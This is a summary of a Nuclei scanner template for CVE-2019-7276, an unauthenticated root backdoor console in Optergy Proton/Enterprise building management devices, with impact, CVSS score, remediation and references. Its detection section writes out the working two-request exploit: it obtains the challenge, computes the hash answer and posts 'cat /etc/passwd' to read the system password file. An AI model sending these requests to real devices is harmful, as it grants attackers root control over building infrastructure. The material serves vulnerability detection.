---
cve_id: CVE-2019-7276
template_path: nuclei-templates/http/cves/2019/CVE-2019-7276.yaml
affected_product: Optergy Proton/Enterprise
severity: critical
authentication: none
external_callback: false
affected_versions: unknown
preconditions: []
poc_classification: rce
---

## Vulnerability
Optergy Proton/Enterprise building management system devices expose an unauthenticated backdoor console at `/tools/ajax/ConsoleResult.html` that permits remote root code execution. Attackers can submit arbitrary Linux commands that run with root privileges, resulting in full device compromise, arbitrary file read/write, and control over connected building management infrastructure.

**Impact:** Complete system takeover (C:H/I:H/A:H).  
**CVSS:3.0:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)  
**Remediation:** Apply vendor firmware updates or disable the console endpoint.

## PoC / Detection
Classification: rce

The template executes a strict two-request flow to verify exploitable RCE capability.  
1. `GET /tools/ajax/ConsoleResult.html?get` extracts the `challenge` token from `.response.message` (JSON).  
2. `POST /tools/ajax/ConsoleResult.html` (application/x-www-form-urlencoded) submits `command=cat /etc/passwd&challenge={{challenge}}&answer={{sha1(challenge)+md5(sha1(challenge))}}`.  

Matchers require: regex `root:.*:0:0:` in body (proves root-level command execution), `application/json` content-type, and HTTP 200. No authentication or external interaction is used.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2019-7276
- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/optergy_bms_backdoor_rce_cve_2019_7276.rb
- https://attackerkb.com/topics/QrYFIjnd3J/cve-2019-7276
- https://www.zeroscience.mk/files/ioybms_gk_2019.pdf
